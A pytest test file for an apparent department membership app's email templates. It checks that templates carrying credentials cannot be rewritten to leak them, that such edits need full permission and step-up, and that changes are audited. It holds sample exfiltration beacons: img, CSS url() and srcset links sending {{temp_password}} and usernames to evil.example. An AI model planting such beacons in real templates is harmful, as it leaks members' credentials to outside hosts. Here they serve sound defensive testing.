"""Credential-carrying email templates cannot be rewritten to leak what they carry.

The welcome email holds a new member's temporary password; the reset, ballot
and applicant-link emails hold tokens. ``settings.manage`` — which the
Secretary holds — could rewrite them, unaudited, to load
``<img src="https://elsewhere/?p={{temp_password}}">`` and collect every new
member's credentials from the department's own sender. Now:

* editing an ``always_sent`` template needs ``*`` and step-up;
* its HTML may only link to the app's own host, a lone placeholder, mailto:
  or tel:;
* every template update and reset is audited with a diff.
"""

import uuid
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import pytest
from fastapi import HTTPException

from app.api.v1.endpoints import email_templates as ep
from app.models.email_template import EmailTemplate, EmailTemplateType
from app.models.user import Organization, User
from app.schemas.email_template import EmailTemplateUpdate
from app.services import email_template_service as svc_module
from app.services.email_template_service import (
    ALWAYS_SENT_TYPES,
    EmailTemplateService,
    protected_template_link_problems,
)

_EXFIL = '<p>Welcome</p><img src="https://evil.example/p?u={{username}}&p={{temp_password}}">'


@pytest.fixture(autouse=True)
def _frontend_url(monkeypatch):
    monkeypatch.setattr(
        svc_module.app_settings, "FRONTEND_URL", "https://logbook.fd.example"
    )


@pytest.mark.unit
class TestLinkPolicy:
    @pytest.mark.parametrize("template_type", sorted(ALWAYS_SENT_TYPES))
    def test_every_shipped_default_passes(self, template_type):
        html = getattr(svc_module, f"DEFAULT_{template_type.name}_HTML")

        assert protected_template_link_problems(html) == []

    def test_a_beacon_carrying_the_password_is_refused(self):
        assert protected_template_link_problems(_EXFIL) == [
            "https://evil.example/p?u={{username}}&p={{temp_password}}"
        ]

    def test_a_placeholder_inside_an_own_host_url_is_refused(self):
        html = '<a href="https://logbook.fd.example/x?t={{reset_url}}">x</a>'

        assert protected_template_link_problems(html) != []

    def test_own_host_mailto_tel_and_anchors_are_allowed(self):
        html = (
            '<a href="https://logbook.fd.example/login">a</a>'
            '<a href="mailto:chief@fd.example">b</a><a href="tel:5550100">c</a>'
            '<a href="#top">d</a>'
        )

        assert protected_template_link_problems(html) == []

    def test_css_fetches_and_srcset_are_caught(self):
        html = (
            '<div style="background:url(//evil.example/a)"></div>'
            "<style>@import 'x.css';</style>"
            '<img srcset="https://evil.example/b 2x">'
        )

        problems = protected_template_link_problems(html)

        assert "//evil.example/a" in problems
        assert "@import" in problems
        assert "https://evil.example/b" in problems

    def test_a_link_inside_an_outlook_conditional_comment_is_caught(self):
        html = '<!--[if mso]><img src="https://evil.example/c"><![endif]-->'

        assert protected_template_link_problems(html) == ["https://evil.example/c"]

    def test_the_shipped_outlook_wrappers_still_pass(self):
        html = (
            '<!--[if mso]><table role="presentation" width="600"><tr><td>'
            "<![endif]--><p>Body</p><!--[if mso]></td></tr></table><![endif]-->"
        )

        assert protected_template_link_problems(html) == []

    def test_an_escaped_css_function_is_refused(self):
        html = '<div style="background-image:u\\72l(//evil.example/d)"></div>'

        assert "CSS escape (\\)" in protected_template_link_problems(html)

    def test_a_bare_url_in_css_is_caught(self):
        html = (
            '<div style="background-image:image-set('
            "'https://evil.example/e' 1x)\"></div>"
        )

        assert "https://evil.example/e" in protected_template_link_problems(html)


async def _officer(db_session, org, permissions):
    # A persisted row so `updated_by` satisfies its foreign key; the caller
    # handed to the endpoint carries the permissions under test.
    row = User(
        organization_id=str(org.id),
        username=f"officer-{uuid.uuid4().hex[:8]}",
        email=f"officer-{uuid.uuid4().hex[:8]}@fd.example",
        first_name="Ofc",
        last_name="Icer",
    )
    db_session.add(row)
    await db_session.flush()
    return SimpleNamespace(
        id=str(row.id),
        username=row.username,
        organization_id=str(org.id),
        rank=None,
        positions=[SimpleNamespace(permissions=permissions)],
        roles=[],
    )


async def _setup(db_session, template_type):
    org = Organization(
        name="Template FD", slug=f"tpl-{uuid.uuid4().hex[:10]}", timezone="UTC"
    )
    db_session.add(org)
    await db_session.flush()
    template = EmailTemplate(
        organization_id=str(org.id),
        template_type=template_type,
        name="Stored",
        subject="Stored subject",
        html_body="<p>Stored</p>",
        text_body="Stored",
        is_active=True,
    )
    db_session.add(template)
    await db_session.flush()
    return org, template


async def _update(db_session, template, user, payload, *, stepup=None):
    audit = AsyncMock()
    ensure = stepup if stepup is not None else AsyncMock()
    with (
        patch.object(ep, "log_audit_event", audit),
        patch.object(ep, "ensure_stepup", ensure),
    ):
        await ep.update_email_template(
            str(template.id),
            EmailTemplateUpdate.model_validate(payload),
            SimpleNamespace(headers={}),
            access_token=None,
            db=db_session,
            current_user=user,
        )
    return SimpleNamespace(audit=audit, stepup=ensure)


@pytest.mark.integration
class TestProtectedTemplateEdits:
    async def test_settings_manage_cannot_edit_the_welcome_email(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.WELCOME)
        secretary = await _officer(db_session, org, ["settings.manage"])

        with pytest.raises(HTTPException) as exc:
            await _update(db_session, template, secretary, {"html_body": _EXFIL})

        assert exc.value.status_code == 403
        assert template.html_body == "<p>Stored</p>"

    async def test_a_full_admin_must_step_up(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.PASSWORD_RESET)
        admin = await _officer(db_session, org, ["*"])
        refusal = AsyncMock(side_effect=HTTPException(status_code=403))

        with pytest.raises(HTTPException):
            await _update(
                db_session, template, admin, {"subject": "New"}, stepup=refusal
            )

        refusal.assert_awaited_once()
        assert template.subject == "Stored subject"

    async def test_even_a_full_admin_cannot_add_a_beacon(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.WELCOME)
        admin = await _officer(db_session, org, ["*"])

        with pytest.raises(HTTPException) as exc:
            await _update(db_session, template, admin, {"html_body": _EXFIL})

        assert exc.value.status_code == 400
        assert template.html_body == "<p>Stored</p>"

    async def test_an_allowed_edit_is_audited_with_a_diff(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.WELCOME)
        admin = await _officer(db_session, org, ["*"])

        result = await _update(
            db_session, template, admin, {"html_body": "<p>Welcome aboard</p>"}
        )

        kwargs = result.audit.await_args.kwargs
        assert kwargs["event_type"] == "email_template_updated"
        assert kwargs["severity"] == "warning"
        change = kwargs["event_data"]["changes"]["html_body"]
        assert "-<p>Stored</p>" in change["diff"]
        assert "+<p>Welcome aboard</p>" in change["diff"]
        assert change["sha256_before"] != change["sha256_after"]


@pytest.mark.integration
class TestOrdinaryTemplateEdits:
    async def test_settings_manage_still_edits_and_is_audited(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.EVENT_REMINDER)
        secretary = await _officer(db_session, org, ["settings.manage"])

        result = await _update(db_session, template, secretary, {"subject": "Soon"})

        assert template.subject == "Soon"
        result.stepup.assert_not_awaited()
        kwargs = result.audit.await_args.kwargs
        assert kwargs["severity"] == "info"
        assert kwargs["event_data"]["changes"] == {
            "subject": {"from": "Stored subject", "to": "Soon"}
        }

    async def test_an_ordinary_template_may_link_anywhere(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.EVENT_REMINDER)
        secretary = await _officer(db_session, org, ["settings.manage"])

        await _update(
            db_session,
            template,
            secretary,
            {"html_body": '<a href="https://county.example/map">Map</a>'},
        )

        assert "county.example" in template.html_body


@pytest.mark.integration
class TestServiceRefusesBeacons:
    async def test_update_template_refuses_off_site_links_on_a_credential_type(
        self, db_session
    ):
        org, template = await _setup(db_session, EmailTemplateType.WELCOME)

        with pytest.raises(ValueError, match="Remove"):
            await EmailTemplateService(db_session).update_template(
                str(template.id), str(org.id), html_body=_EXFIL
            )


@pytest.mark.integration
class TestResetIsAudited:
    async def test_a_reset_records_what_it_replaced(self, db_session):
        org, template = await _setup(db_session, EmailTemplateType.WELCOME)
        audit = AsyncMock()

        with patch.object(ep, "log_audit_event", audit):
            await ep.reset_email_template(
                str(template.id),
                db=db_session,
                current_user=await _officer(db_session, org, ["settings.manage"]),
            )

        kwargs = audit.await_args.kwargs
        assert kwargs["event_type"] == "email_template_reset"
        assert kwargs["severity"] == "warning"
        assert "html_body" in kwargs["event_data"]["changes"]
